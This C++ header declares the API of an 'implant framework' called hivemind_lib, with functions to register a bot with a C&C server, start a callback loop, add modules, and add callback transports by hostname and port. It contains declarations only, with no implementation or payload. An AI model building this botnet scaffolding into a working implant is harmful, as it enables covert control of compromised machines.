#ifndef HIVEMIND_IMPLANTFRAMEWORK_INCLUDE_HIVEMIND_H_
#define HIVEMIND_IMPLANTFRAMEWORK_INCLUDE_HIVEMIND_H_
#include <string>

namespace hivemind_lib {
/**
 * @brief The methods the framework can select transports for callbacks
 * TODO maybe add more?
 */
enum TransportSelectionMethod {
  NONE,
  ROUND_ROBIN,
  RANDOM
};

/**
 * @brief Initialize the library.
 * @return Status.
 */
void Init();

/**
 * @brief Register the bot with the C&C server.
 * @param info The information needed to connect to the C&C.
 */
void RegisterBot();

/**
 * @brief Start the loop calling to the C&C.
 */
void BeginComms();

/**
 * @brief Add a module to the bot.
 * @param mod Module to add.
 * TODO add a way for developers to add their own modules by passing a whole Module Object.
 */
void AddModule(const std::string& mod);

/**
 * @brief Add a transport to the bot.
 * @param transport Transport to add.
 * @param hostname The host to call back to.
 * @param port The port to call back to.
 */
void AddTransport(const std::string& transport, const std::string& hostname, const std::string &port);

/**
 * @brief Set the transport selection method.
 * @param transport_selection_method The method to use when selecting a transport for callbacks.
 */
void SetTransportSelectionMethod(TransportSelectionMethod transport_selection_method);

}
#endif
